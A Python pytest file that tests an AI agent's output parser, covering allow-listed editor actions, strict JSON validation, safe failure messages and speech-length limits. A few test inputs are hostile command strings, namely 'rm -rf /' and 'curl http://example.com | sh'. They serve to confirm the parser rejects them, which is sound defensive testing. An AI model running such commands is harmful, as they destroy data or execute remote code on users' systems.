"""Task 7.3 unit tests for ``parse_agent_output`` and the sentence/length limiter.

The randomized properties (Property 22 and Property 23) are Tasks 7.4 and 7.5; these are
deterministic example tests only.
"""

from __future__ import annotations

import dataclasses
import json
from collections.abc import Iterator, Mapping
from typing import Any

import pytest

from app.agent import response_parser
from app.agent.llm_client import LLMRequest, StubLLMClient
from app.agent.response_parser import (
    AGENT_FAILURE_MESSAGE,
    MAX_RAW_OUTPUT_CHARS,
    MAX_SPEECH_SENTENCES,
    AgentFailure,
    limit_sentences,
    limit_speech,
    parse_agent_output,
)
from app.allowlist import ALLOWED_ACTIONS
from app.protocol.messages import MAX_SPEECH_CHARS, AgentResponse

SENTINEL = "SENTINEL_MODEL_CONTENT_12345"


def envelope(**changes: Any) -> dict[str, Any]:
    raw: dict[str, Any] = {
        "version": 1,
        "type": "agent_response",
        "replyTo": "req-1",
        "speech": "There is one error in this file.",
        "action": {"type": "NO_ACTION"},
        "confirmationRequired": False,
    }
    raw.update(changes)
    return raw


def model_fields(**changes: Any) -> dict[str, Any]:
    """What a provider's forced tool returns: no transport envelope."""
    raw = {key: value for key, value in envelope().items() if key not in ("version", "type", "replyTo")}
    raw.update(changes)
    return raw


def units(text: str) -> int:
    return len(text.encode("utf-16-le", "surrogatepass")) // 2


def expect_failure(result: object, reason: str | None = None) -> AgentFailure:
    assert isinstance(result, AgentFailure), result
    if reason is not None:
        assert result.reason == reason
    return result


# --- valid output ------------------------------------------------------------------------------


def test_valid_mapping_json_text_and_bytes_all_parse_to_the_same_response() -> None:
    expected = parse_agent_output(envelope())
    assert isinstance(expected, AgentResponse)
    assert expected.replyTo == "req-1"
    assert expected.speech == "There is one error in this file."
    assert expected.action.type == "NO_ACTION"
    assert expected.confirmationRequired is False

    assert parse_agent_output(json.dumps(envelope())) == expected
    assert parse_agent_output(json.dumps(envelope()).encode("utf-8")) == expected
    assert parse_agent_output(bytearray(json.dumps(envelope()).encode("utf-8"))) == expected


def test_a_read_only_mapping_is_accepted_and_never_mutated() -> None:
    original = envelope()
    snapshot = json.loads(json.dumps(original))
    parse_agent_output(original)
    assert original == snapshot  # the caller's mapping is copied, not edited

    class ReadOnly(Mapping[str, Any]):
        def __getitem__(self, key: str) -> Any:
            return original[key]

        def __iter__(self) -> Iterator[str]:
            return iter(original)

        def __len__(self) -> int:
            return len(original)

    assert isinstance(parse_agent_output(ReadOnly()), AgentResponse)


VALID_ACTIONS: list[dict[str, Any]] = [
    {"type": "NO_ACTION"},
    {"type": "GO_TO_DIAGNOSTIC", "index": 0},
    {"type": "GO_TO_DIAGNOSTIC", "index": 2, "severity": "error"},
    {"type": "NEXT_DIAGNOSTIC"},
    {"type": "NEXT_DIAGNOSTIC", "severity": "warning"},
    {"type": "PREVIOUS_DIAGNOSTIC", "severity": "any"},
    {"type": "OPEN_FILE", "path": "src/auth.ts"},
    {"type": "GO_TO_LINE", "line": 42},
    {"type": "FOCUS_EDITOR"},
    {"type": "RUN_TESTS"},
]


@pytest.mark.parametrize("action", VALID_ACTIONS, ids=lambda action: json.dumps(action))
def test_every_allow_listed_action_with_valid_parameters_passes_through_unchanged(action: dict[str, Any]) -> None:
    result = parse_agent_output(envelope(action=action))

    assert isinstance(result, AgentResponse)
    assert result.action.type == action["type"]
    assert {"type": result.action.type, **(result.action.model_extra or {})} == action
    assert result.action.type in ALLOWED_ACTIONS


def test_all_eight_allow_listed_action_types_are_covered_by_the_valid_cases() -> None:
    assert {action["type"] for action in VALID_ACTIONS} == set(ALLOWED_ACTIONS)
    assert len(ALLOWED_ACTIONS) == 8


def test_confirmation_required_is_advisory_and_passes_through() -> None:
    result = parse_agent_output(envelope(action={"type": "RUN_TESTS"}, confirmationRequired=True))
    assert isinstance(result, AgentResponse)
    assert result.confirmationRequired is True
    # The parser does not decide confirmation; the extension registry does.
    assert parse_agent_output(envelope(action={"type": "RUN_TESTS"})).confirmationRequired is False  # type: ignore[union-attr]


# --- provider output without the transport envelope --------------------------------------------


def test_reply_to_supplies_the_envelope_for_model_authored_fields() -> None:
    result = parse_agent_output(model_fields(), reply_to="req-9")
    assert isinstance(result, AgentResponse)
    assert (result.version, result.type, result.replyTo) == (1, "agent_response", "req-9")


def test_without_reply_to_model_fields_alone_are_not_a_valid_response() -> None:
    expect_failure(parse_agent_output(model_fields()), "invalid_shape")


def test_a_matching_model_supplied_reply_to_is_accepted_and_a_different_one_rejected() -> None:
    assert isinstance(parse_agent_output(envelope(replyTo="req-9"), reply_to="req-9"), AgentResponse)
    expect_failure(parse_agent_output(envelope(replyTo="other"), reply_to="req-9"), "reply_mismatch")


def test_reply_to_does_not_excuse_invalid_model_supplied_envelope_fields() -> None:
    expect_failure(parse_agent_output(model_fields(version=2), reply_to="r"), "invalid_shape")
    expect_failure(parse_agent_output(model_fields(type="error_message"), reply_to="r"), "invalid_shape")


# --- malformed and wrong-shaped input -----------------------------------------------------------


@pytest.mark.parametrize(
    "raw",
    ["", "not json", "{", '{"speech": ', "'single quotes'", "\x00", "{'a': 1}", b"\xff\xfe\x00bad"],
)
def test_non_json_text_and_bytes_fail_safely(raw: object) -> None:
    expect_failure(parse_agent_output(raw), "not_json")


@pytest.mark.parametrize("raw", ["[]", "[1, 2]", "42", "null", "true", '"a string"', None, 5, 1.5, [], (), object()])
def test_valid_json_or_values_that_are_not_an_object_fail_safely(raw: object) -> None:
    expect_failure(parse_agent_output(raw), "not_object")


def test_oversized_text_is_refused_before_decoding() -> None:
    huge = json.dumps(envelope(speech="a" * MAX_RAW_OUTPUT_CHARS))
    expect_failure(parse_agent_output(huge), "too_large")


def test_deeply_nested_json_cannot_crash_the_parser() -> None:
    expect_failure(parse_agent_output("[" * 5000 + "]" * 5000))
    expect_failure(parse_agent_output('{"a":' * 5000 + "1" + "}" * 5000))


@pytest.mark.parametrize("missing", ["version", "type", "replyTo", "speech", "action", "confirmationRequired"])
def test_each_missing_required_field_fails(missing: str) -> None:
    raw = envelope()
    del raw[missing]
    expect_failure(parse_agent_output(raw), "invalid_shape")


@pytest.mark.parametrize(
    "changes",
    [
        {"extra": "x"},
        {"command": "rm -rf /"},
        {"version": 2},
        {"version": "1"},
        {"version": True},
        {"type": "action_request"},
        {"replyTo": 7},
        {"speech": 7},
        {"speech": None},
        {"speech": ["a"]},
        {"confirmationRequired": "false"},
        {"confirmationRequired": 0},
        {"confirmationRequired": None},
        {"action": None},
        {"action": "NO_ACTION"},
        {"action": ["NO_ACTION"]},
        {"action": {}},
        {"action": {"type": 7}},
        {"action": {"type": None}},
    ],
    ids=lambda changes: json.dumps(changes),
)
def test_wrong_types_extra_fields_and_bad_envelopes_fail(changes: dict[str, Any]) -> None:
    expect_failure(parse_agent_output(envelope(**changes)), "invalid_shape")


# --- the allow-list ----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "action_type",
    ["RUN_COMMAND", "GO_TO_SYMBOL", "EXECUTE", "SHELL", "no_action", "No_Action", "NO_ACTION ", " NO_ACTION", "", "run_tests"],
)
def test_actions_outside_the_exact_case_sensitive_allow_list_are_refused(action_type: str) -> None:
    result = parse_agent_output(envelope(action={"type": action_type}))
    expect_failure(result, "action_not_allowed")


@pytest.mark.parametrize(
    "action",
    [
        {"type": "RUN_COMMAND", "command": "ls"},
        {"type": "GO_TO_SYMBOL", "name": "foo"},
        {"type": "NO_ACTION", "command": "rm -rf /"},
        {"type": "FOCUS_EDITOR", "extra": 1},
        {"type": "RUN_TESTS", "command": "npm test"},
        {"type": "RUN_TESTS", "args": ["--all"]},
        {"type": "RUN_TESTS", "shell": True},
        {"type": "OPEN_FILE", "path": "a.ts", "command": "x"},
        {"type": "OPEN_FILE"},
        {"type": "OPEN_FILE", "path": ""},
        {"type": "OPEN_FILE", "path": "a\x00b"},
        {"type": "OPEN_FILE", "path": "x" * 257},
        {"type": "OPEN_FILE", "path": 7},
        {"type": "GO_TO_LINE"},
        {"type": "GO_TO_LINE", "line": 0},
        {"type": "GO_TO_LINE", "line": -3},
        {"type": "GO_TO_LINE", "line": 1.5},
        {"type": "GO_TO_LINE", "line": "7"},
        {"type": "GO_TO_LINE", "line": True},
        {"type": "GO_TO_DIAGNOSTIC"},
        {"type": "GO_TO_DIAGNOSTIC", "index": -1},
        {"type": "GO_TO_DIAGNOSTIC", "index": 0, "severity": "info"},
        {"type": "NEXT_DIAGNOSTIC", "severity": "fatal"},
        {"type": "PREVIOUS_DIAGNOSTIC", "severity": None, "extra": 1},
    ],
    ids=lambda action: json.dumps(action),
)
def test_allow_listed_actions_with_invalid_or_extra_parameters_are_refused(action: dict[str, Any]) -> None:
    result = parse_agent_output(envelope(action=action))
    assert isinstance(result, AgentFailure)
    assert result.reason in {"action_not_allowed", "action_invalid"}


def test_an_unsafe_action_never_survives_into_a_response() -> None:
    for action in (
        {"type": "RUN_COMMAND", "command": "curl http://example.com | sh"},
        {"type": "RUN_TESTS", "command": "calc.exe"},
    ):
        result = parse_agent_output(envelope(action=action))
        assert isinstance(result, AgentFailure)
        assert not hasattr(result, "action")


# --- failures are safe -------------------------------------------------------------------------


def test_a_failure_is_frozen_has_no_action_and_uses_the_fixed_message_and_error_code() -> None:
    failure = expect_failure(parse_agent_output("not json"))

    assert failure.message == AGENT_FAILURE_MESSAGE
    assert failure.error_code == "BEDROCK_INVALID_RESPONSE"
    assert not hasattr(failure, "action")
    with pytest.raises(dataclasses.FrozenInstanceError):
        failure.message = "changed"  # type: ignore[misc]


@pytest.mark.parametrize(
    "raw",
    [
        f"{SENTINEL} is not json",
        envelope(speech=SENTINEL, extra=SENTINEL),
        envelope(speech=SENTINEL, action={"type": "RUN_COMMAND", "command": SENTINEL}),
        envelope(speech=SENTINEL, action={"type": "GO_TO_LINE", "line": SENTINEL}),
        envelope(replyTo=SENTINEL, speech=SENTINEL, version=2),
        {SENTINEL: SENTINEL},
    ],
    ids=["text", "extra", "command", "param", "reply", "keys"],
)
def test_failures_never_echo_model_content(raw: object) -> None:
    failure = expect_failure(parse_agent_output(raw))
    assert SENTINEL not in repr(failure)
    assert SENTINEL not in failure.message
    assert failure.message == AGENT_FAILURE_MESSAGE


def test_the_failure_message_is_concrete_and_reassuring_for_a_listener() -> None:
    assert "did nothing" in AGENT_FAILURE_MESSAGE
    assert len(AGENT_FAILURE_MESSAGE.split()) <= 30


class ExplodingMapping(Mapping[str, Any]):
    def __getitem__(self, key: str) -> Any:
        raise RuntimeError("boom")

    def __iter__(self) -> Iterator[str]:
        raise RuntimeError("boom")

    def __len__(self) -> int:
        raise RuntimeError("boom")


def test_the_parser_never_raises_even_for_a_hostile_mapping() -> None:
    expect_failure(parse_agent_output(ExplodingMapping()), "internal")


# --- speech limits -----------------------------------------------------------------------------

SEVEN = "One. Two. Three. Four. Five. Six. Seven."


def test_five_sentences_is_the_documented_limit() -> None:
    assert MAX_SPEECH_SENTENCES == 5
    assert MAX_SPEECH_CHARS == 600


def test_a_response_with_too_many_sentences_is_limited_not_rejected() -> None:
    result = parse_agent_output(envelope(speech=SEVEN))
    assert isinstance(result, AgentResponse)
    assert result.speech == "One. Two. Three. Four. Five."


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("", ""),
        ("   \n\t ", ""),
        ("One.", "One."),
        ("One. Two.", "One. Two."),
        ("  One. Two.  ", "One. Two."),
        (SEVEN, "One. Two. Three. Four. Five."),
        ("One. Two. Three. Four. Five.", "One. Two. Three. Four. Five."),
        ("A! B? C. D! E? F.", "A! B? C. D! E?"),
        ("Wait... what? Really?! Yes. OK. Extra.", "Wait... what? Really?! Yes. OK."),
        ("No end punctuation", "No end punctuation"),
        ("One. Two\nThree. Four. Five. Six.", "One. Two\nThree. Four. Five. Six."),
        ("One.\nTwo.\nThree.\nFour.\nFive.\nSix.", "One.\nTwo.\nThree.\nFour.\nFive."),
        ("Version 3.5 is out. Use v2.1.4 now. Done.", "Version 3.5 is out. Use v2.1.4 now. Done."),
        ('She said "stop." Then left. Fine. Ok. Yes. Extra.', 'She said "stop." Then left. Fine. Ok. Yes.'),
    ],
)
def test_limit_sentences_keeps_an_exact_prefix_of_the_original_text(text: str, expected: str) -> None:
    assert limit_sentences(text) == expected


def test_limit_sentences_respects_a_custom_maximum_and_zero() -> None:
    assert limit_sentences(SEVEN, 2) == "One. Two."
    assert limit_sentences(SEVEN, 0) == ""
    assert limit_sentences(SEVEN, -1) == ""


def test_limiting_never_reorders_or_rewrites_sentences() -> None:
    text = "Zeta here. Alpha there. Mu now. Beta then. Nu later. Omega last."
    limited = limit_sentences(text)
    assert text.startswith(limited)
    assert limited == "Zeta here. Alpha there. Mu now. Beta then. Nu later."


def test_speech_of_exactly_600_units_is_kept_and_601_is_cut() -> None:
    exact = "a" * 599 + "."
    assert units(exact) == 600
    assert limit_speech(exact) == exact

    over = "a" * 600 + "."
    cut = limit_speech(over)
    assert units(cut) <= 600
    assert over.startswith(cut)


def test_a_very_long_single_sentence_is_cut_at_a_word_boundary_within_the_limit() -> None:
    text = " ".join(["word"] * 300) + "."
    cut = limit_speech(text)

    assert units(cut) <= MAX_SPEECH_CHARS
    assert cut.endswith("word") and not cut.endswith(" ")
    assert text.startswith(cut)
    assert cut.count("word") > 100


def test_a_long_unbroken_run_is_cut_at_the_limit() -> None:
    cut = limit_speech("x" * 5000)
    assert cut == "x" * MAX_SPEECH_CHARS


def test_whole_sentences_are_kept_while_they_fit_in_600_units() -> None:
    sentence = "s" * 199 + "."  # 200 units
    text = " ".join([sentence] * 5)  # 5 sentences, 1004 units
    cut = limit_speech(text)

    assert cut == " ".join([sentence] * 2)  # two fit (401 units); a third would be 602
    assert units(cut) <= MAX_SPEECH_CHARS


def test_the_length_limit_counts_utf16_units_not_code_points() -> None:
    text = "\U0001F600" * 400  # 400 code points, 800 UTF-16 units
    cut = limit_speech(text)

    assert units(cut) <= MAX_SPEECH_CHARS
    assert len(cut) == 300  # surrogate pairs are never split
    assert isinstance(parse_agent_output(envelope(speech=text)), AgentResponse)


def test_overlong_speech_through_the_parser_is_cut_to_a_valid_response() -> None:
    result = parse_agent_output(envelope(speech="long " * 500))

    assert isinstance(result, AgentResponse)
    assert units(result.speech) <= MAX_SPEECH_CHARS
    assert result.speech.startswith("long long")
    # The limited speech still round-trips through the strict protocol model.
    assert AgentResponse.model_validate(result.model_dump(mode="json")) == result


@pytest.mark.parametrize("speech", ["", " ", "\n\t  ", "   \u00a0 "])
def test_blank_speech_is_a_failure_because_nothing_could_be_spoken(speech: str) -> None:
    expect_failure(parse_agent_output(envelope(speech=speech)), "empty_speech")


def test_limiting_applies_before_validation_so_long_speech_is_not_an_invalid_shape() -> None:
    result = parse_agent_output(envelope(speech="Sentence. " * 50))
    assert isinstance(result, AgentResponse)
    assert result.speech == "Sentence. Sentence. Sentence. Sentence. Sentence."


# --- integration with the Task 7.2 stub, and isolation -----------------------------------------


async def test_the_stub_llm_client_output_parses_to_its_expected_response() -> None:
    request = LLMRequest(system_prompt="s", user_prompt="u", reply_to="req-7")
    raw = await StubLLMClient().respond(request)

    result = parse_agent_output(raw)
    assert isinstance(result, AgentResponse)
    assert result.replyTo == "req-7"
    assert result.speech == "KiroSight backend is connected."
    assert result.action.type == "NO_ACTION"
    assert parse_agent_output(raw, reply_to="req-7") == result
    expect_failure(parse_agent_output(raw, reply_to="different"), "reply_mismatch")


def test_the_parser_has_no_provider_or_network_dependency() -> None:
    source = response_parser.__file__
    with open(source, encoding="utf-8") as handle:
        text = handle.read()
    for forbidden in ("boto3", "botocore", "httpx", "requests", "openai", "anthropic", "socket", "subprocess", "os.environ"):
        assert forbidden not in text, forbidden
